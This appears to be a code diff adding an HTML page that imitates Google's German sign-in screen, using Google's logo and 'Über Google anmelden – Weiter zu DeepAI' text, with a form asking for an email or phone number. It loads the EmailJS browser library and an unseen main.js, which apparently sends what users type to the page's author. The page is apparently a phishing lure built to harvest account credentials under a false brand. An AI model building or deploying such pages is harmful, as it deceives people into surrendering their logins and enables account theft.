@@ -1,0 +1,301 @@
+<!doctype html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet"/>
+  <style>
+body{
+  background-color: black;
+  margin:0;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      position: relative;
+      font-family: 'Roboto', sans-serif;
+      height:100vh;
+      overflow:hidden;
+}
+.form-group{
+    height: 48px;
+    margin: 9px;
+    position: relative;
+}
+
+.form-control{
+    position: absolute;
+    top:0;
+    left:0;
+    width: 100%;
+    height: 100%;
+    background:none;
+    outline:none;
+    border-radius:3px;
+    z-index: 1;
+    color: white;
+    border: 1px solid #333;
+}
+.class-label{
+    position: absolute;
+    left:13px;
+    top:13px;
+    color:#BEBEBE;
+    background-color:black;
+    padding: 0 6px;
+    font-size:14px;
+    transition: .4s;
+}
+.form-control:focus+ .class-label{
+    top:-12px;
+    z-index:10;
+    color: #7AADFF;
+    font-weight: 300px;
+
+}
+.form-control:focus{
+    border: 2px solid #7AADFF;
+}
+.form-control:not(:focus):valid+label{
+    top:-12px;
+    z-index:10;
+}
+    /* Hauptcontainer */
+    .main-components {
+      max-width: 400px;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Top-Container: Logo bis hr */
+    .top-section {
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Bottom-Container: restlicher Inhalt */
+    .bottom-section {
+      padding: 0 10px;
+    }
+
+    /* Header mit Logo, H1 und Linie */
+    .header {
+      display: flex;
+      color: white;
+      flex-direction: column;
+      align-items: flex-start;
+      margin-bottom: 40px;
+    }
+
+    .top-row {
+      display: flex;
+      align-items: center;
+    }
+
+    .logo {
+      height: 25px;
+      padding: 0px 10px;
+    }
+
+    h1 {
+      font-size: 24px;
+      font-weight: 400;
+      margin: 0;
+      color: white;
+    }
+
+    hr {
+      width: 100%;
+      height: 2px;
+      background-color: #ccc; /* Grau bleibt gleich */
+      border: none;
+    }
+
+    .subtext {
+      color: white; /* Weiß */
+      font-size: 16px;
+      padding: 0px 10px;
+      text-align: left;
+      margin-bottom: 20px;
+    }
+
+    .link {
+      color: #7AADFF;
+      font-size: 14px;
+      text-decoration: none;
+      display: inline-block;
+      margin-bottom: 30px;
+    }
+
+    .info-text {
+      font-size: 13px;
+      color: #aaa; /* Grau für Hilfe, Datenschutz etc. */
+      margin-bottom: 30px;
+    }
+
+    .info-text a {
+      color: #7AADFF;
+      
+      text-decoration: none;
+    }
+
+    /* Button Style */
+    #loginButton {
+      background-color: #7AADFF;
+      color: black;
+      border: none;
+      padding: 10px 24px;
+      border-radius: 20px;
+      font-size: 14px;
+      cursor: pointer;
+      margin-left: auto;
+      display: block;
+      margin-top: 8px;
+    }
+
+    /* Unten links "Deutsch" */
+    .bottom-left {
+      position: fixed;
+      bottom: 20px;
+      left: 16px;
+      font-size: 14px;
+      color: #aaa; /* Grau */
+      z-index: 10;
+    }
+
+    /* Dreieck Button */
+    .language-toggle {
+      position: fixed;
+      bottom: 20px;
+      width: 15px;
+      height: 15px;
+      background-color: gray;
+      border-radius: 4px;
+      clip-path: polygon(0% 0%, 100% 0%, 50% 60%);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 10;
+    }
+
+    /* Sprachliste (bei Klick) */
+    .language-list {
+      position: fixed;
+      bottom: 50px; /* über dem Dreieck */
+      left: 14px;
+      background: #000; /* Schwarz */
+      border: 1px solid #555; /* Grau für Rahmen */
+      border-radius: 4px;
+      display: none;
+      flex-direction: column;
+      padding: 8px 0;
+      min-width: 120px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.5);
+      z-index: 20;
+    }
+
+    .language-list.show {
+      display: flex;
+    }
+
+    .language-item {
+      padding: 8px 16px;
+      cursor: pointer;
+      color: white; /* Text in Sprachelementen weiß */
+    }
+
+    .language-item:hover {
+      background-color: #222;
+    }
+    .footer-links {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 13px;
+      color: #aaa; /* Grau */
+    }
+    .footer-links a {
+      color: #aaa;
+      margin: 0 10px;
+      text-decoration: none;
+    }
+
+    /* layout centering */
+    .viewport {
+      width:100%;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      padding: 20px 0;
+      box-sizing:border-box;
+    }
+
+    .card {
+      width:100%;
+      max-width:420px;
+      background: transparent;
+      padding: 0 8px;
+      box-sizing:border-box;
+    }
+
+  </style>
+  <title></title>
+</head>
+<body>
+  <div class="viewport">
+    <div class="card main-components">
+
+      <div class="top-section">
+        <div class="header">
+          <div class="top-row">
+            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google Logo" />
+            <p style="padding: 0px 10px; color: white; margin:0">Über Google anmelden</p>
+          </div>
+          <hr />
+        </div>
+      </div>
+
+      <div class="bottom-section">
+        <h1 style="padding: 10px 10px; color: white">Anmeldung</h1>
+        <p class="subtext">Weiter zu DeepAI</p>
+
+        <form id="sendForm" class="form" novalidate>
+            <div class="form-group">
+                <input type="text" name="name" id="name" class="form-control" required autocomplete="off" />
+                <label for="name" class="class-label">E-Mail oder Telefonnummer</label>
+            </div>
+
+            <a href="#" class="link" style="padding: 0px 10px; color:#7AADFF">E-Mail-Adresse vergessen?</a>
+
+            <div class="info-text">
+              <a href="#" style="padding: 0px 10px; color:#7AADFF">Konto erstellen</a>
+            </div>
+
+            <input type="submit" id="loginButton" value="Weiter" />
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <div class="bottom-left">Deutsch</div>
+  <div class="language-toggle" id="langBtn" title="Andere Sprachen auswählen"></div>
+
+  <div class="language-list" id="langList" aria-hidden="true">
+    <div class="language-item">Deutsch</div>
+    <div class="language-item">Englisch</div>
+    <div class="language-item">Französisch</div>
+    <div class="language-item">Spanisch</div>
+  </div>
+
+  <!-- Import map for esm.sh -->
+  <script type="importmap">
+  {
+    "imports": {
+      "@emailjs/browser": "https://esm.sh/@emailjs/browser@3.3.0"
+    }
+  }
+  </script>
+
+  <script type="module" src="./main.js"></script>
+</body>
+</html>
